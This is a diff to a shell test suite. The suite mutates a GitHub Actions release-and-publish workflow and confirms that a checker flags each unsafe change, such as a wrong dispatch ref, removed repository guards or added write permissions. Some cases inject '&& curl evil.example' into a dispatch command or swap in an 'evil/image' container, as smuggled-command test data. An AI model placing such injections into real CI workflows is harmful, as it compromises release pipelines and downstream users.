@@ -40,11 +40,13 @@ PY
 }
 
 case_ "the real workflow"                          ok      ''
-case_ "dispatch on main instead of the tag"        flagged "s = s.replace('--ref \"\$TAG\"', '--ref main')"
-case_ "dispatch on the triggering ref"             flagged "s = s.replace('--ref \"\$TAG\"', '--ref \"\$GITHUB_REF_NAME\"')"
+case_ "dispatch on main instead of the tag"        flagged "s = s.replace('--ref \"refs/tags/\$TAG\"', '--ref main')"
+case_ "dispatch on the triggering ref"             flagged "s = s.replace('--ref \"refs/tags/\$TAG\"', '--ref \"\$GITHUB_REF_NAME\"')"
+case_ "dispatch by bare tag name (branch clash)"   flagged "s = s.replace('--ref \"refs/tags/\$TAG\"', '--ref \"\$TAG\"')"
+case_ "extra command appended to the dispatch"     flagged "s = s.replace('--ref \"refs/tags/\$TAG\"\n', '--ref \"refs/tags/\$TAG\" && curl evil.example\n')"
 case_ "tag not validated"                          flagged "import re; s = re.sub(r'\\[\\[ \"\\\$TAG\" =~[^\\n]*\\|\\| \\{[^\\n]*\\}\\n\\s*', '', s)"
 case_ "TAG taken from somewhere else"              flagged "s = s.replace('TAG: \${{ needs.release-please.outputs.tag_name }}', 'TAG: \${{ github.ref_name }}')"
-case_ "repository condition removed (release-please)" flagged "s = s.replace(\"github.repository == 'bx-shef/b24-ui' && vars.NPM_RELEASE == 'true'\\n    runs-on\", \"vars.NPM_RELEASE == 'true'\\n    runs-on\", 1)"
+case_ "repository condition removed (release-please)" flagged "s = s.replace(\"github.repository == 'bx-shef/b24-ui' && vars.NPM_RELEASE == 'true' &&\\n      github.ref\", \"vars.NPM_RELEASE == 'true' &&\\n      github.ref\")"
 case_ "repository condition removed (publish)"     flagged "s = s.replace(\"github.repository == 'bx-shef/b24-ui' && vars.NPM_RELEASE == 'true' &&\\n      needs\", \"vars.NPM_RELEASE == 'true' &&\\n      needs\")"
 case_ "NPM_RELEASE removed (publish)"              flagged "s = s.replace(\" && vars.NPM_RELEASE == 'true' &&\\n      needs\", \" &&\\n      needs\")"
 case_ "publish runs without release_created"      flagged "s = s.replace(\" &&\\n      needs.release-please.outputs.release_created == 'true'\", '')"
@@ -55,6 +57,15 @@ case_ "dispatch job checks out code"               flagged "s = s.replace('    s
 case_ "ci job gains a permission"                  flagged "s = s.replace('      actions: write\\n    steps:\\n      - name: Run CI', '      actions: write\\n      contents: write\\n    steps:\\n      - name: Run CI')"
 case_ "workflow-level write permission"            flagged "s = s.replace('permissions:\\n  contents: read\\n\\njobs:', 'permissions:\\n  contents: write\\n\\njobs:', 1)"
 case_ "dispatch job loses its need"                flagged "s = s.replace('  publish:\\n    needs: release-please\\n', '  publish:\\n')"
+
+case_ "release-please runs from any branch"       flagged "s = s.replace(\" &&\\n      github.ref == 'refs/heads/main'\", '', 1)"
+case_ "job-level env on the dispatch job"          flagged "s = s.replace('    permissions:\\n      actions: write\\n    steps:\\n      - name: Dispatch', '    env:\\n      X: 1\\n    permissions:\\n      actions: write\\n    steps:\\n      - name: Dispatch')"
+case_ "job-level container on the dispatch job"    flagged "s = s.replace('    permissions:\\n      actions: write\\n    steps:\\n      - name: Dispatch', '    container: evil/image\\n    permissions:\\n      actions: write\\n    steps:\\n      - name: Dispatch')"
+case_ "ci-release-pr without its if"               flagged "s = s.replace(\"      needs.release-please.outputs.prs_created == 'true'\\n\", \"      true\\n\")"
+case_ "ci-release-pr runs for any repository"      flagged "s = s.replace(\"github.repository == 'bx-shef/b24-ui' && vars.NPM_RELEASE == 'true' &&\\n      needs.release-please.outputs.prs_created\", \"vars.NPM_RELEASE == 'true' &&\\n      needs.release-please.outputs.prs_created\")"
+case_ "ci-release-pr ref not from pr_branch"       flagged "s = s.replace('BRANCH: \${{ needs.release-please.outputs.pr_branch }}', 'BRANCH: \${{ github.head_ref }}')"
+case_ "ci-release-pr runs another command"         flagged "s = s.replace('--ref \"\$BRANCH\"', '--ref \"\$BRANCH\" && curl evil.example')"
+case_ "pr_branch output removed"                   flagged "import re; s = re.sub(r'      pr_branch: [^\\n]*\\n', '', s)"
 
 echo
 echo "$pass passed, $fail failed"
